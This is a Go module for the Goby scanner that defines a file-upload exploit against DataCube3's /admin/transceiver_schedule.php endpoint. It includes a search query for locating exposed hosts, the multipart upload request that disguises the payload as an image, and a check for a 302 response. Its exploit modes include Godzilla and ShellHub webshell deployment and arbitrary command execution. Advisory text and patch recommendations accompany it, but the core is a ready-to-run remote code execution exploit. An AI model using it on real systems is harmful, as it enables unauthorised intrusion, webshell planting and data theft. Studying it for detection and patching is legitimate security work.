package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "DataCube3 /admin/transceiver_schedule.php File Upload Vulnerability",
    "Description": "<p>DataCube3 is a system designed for terminal measurement and data management. The /admin/transceiver_schedule.php interface has a file upload vulnerability, which allows attackers to upload malicious files and execute arbitrary code in the system, leading to system compromise or data leakage.</p>",
    "Product": "DataCube3",
    "Homepage": "https://www.f-logic.jp/",
    "DisclosureDate": "2024-10-26",
    "PostTime": "2024-12-16",
    "Author": "1251220046@qq.com",
    "FofaQuery": "title==\"DataCube3\" && body=\"refs.btnLogin.click()\"",
    "GobyQuery": "title==\"DataCube3\" && body=\"refs.btnLogin.click()\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit the /admin/transceiver_schedule.php interface to upload malicious files, execute arbitrary code in the system, and cause system compromise, data leakage, or service disruption.</p>",
    "Recommendation": "<p>1. Restrict access to the /admin/transceiver_schedule.php interface to authorized users only.2. Perform strict validation on the type and content of uploaded files, prohibiting the upload of executable files.3. Update the system to the latest version and apply security patches provided by the vendor.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "ShellHub,Godzilla,Command,Customize",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/admin/transceiver_schedule.php?usb_schedule",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
                    "Content-Type": "multipart/form-data; boundary=00content0boundary00",
                    "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
                    "Content-Length": "185",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "--00content0boundary00\r\nContent-Disposition: form-data; name=\"upload_file\"; filename=\"{{{FILENAME}}}\"\r\nContent-Type: image/jpeg\r\n\r\n{{{CONTENT}}}\r\n--00content0boundary00--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "DataCube3终端测量系统 /admin/transceiver_schedule.php 文件上传漏洞",
            "Product": "DataCube3",
            "Description": "<p>DataCube3终端测量系统是一款用于终端测量和数据管理的系统。其 /admin/transceiver_schedule.php 接口存在文件上传漏洞，攻击者可以利用该漏洞上传恶意文件，从而在系统中执行任意代码，导致系统被入侵或数据泄露。</p>",
            "Recommendation": "<p>1、关注厂商官网，及时关注更新信息：<a href=\"http://www.f-logic.jp\">www.f-logic.jp</a></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可以通过 /admin/transceiver_schedule.php 接口上传恶意文件，从而在系统中执行任意代码，导致系统被入侵、数据泄露或服务中断。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "DataCube3 /admin/transceiver_schedule.php File Upload Vulnerability",
            "Product": "DataCube3",
            "Description": "<p>DataCube3 is a system designed for terminal measurement and data management. The /admin/transceiver_schedule.php interface has a file upload vulnerability, which allows attackers to upload malicious files and execute arbitrary code in the system, leading to system compromise or data leakage.</p>",
            "Recommendation": "<p>1. Restrict access to the /admin/transceiver_schedule.php interface to authorized users only.2. Perform strict validation on the type and content of uploaded files, prohibiting the upload of executable files.3. Update the system to the latest version and apply security patches provided by the vendor.</p>",
            "Impact": "<p>Attackers can exploit the /admin/transceiver_schedule.php interface to upload malicious files, execute arbitrary code in the system, and cause system compromise, data leakage, or service disruption.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|php",
        "FILE_PATH": "define|variable|/admin/data/{{{FILENAME}}}",
        "VUL_URL": "define|variable|/admin/transceiver_schedule.php?usb_schedule"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "FILE_PATH",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9978"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }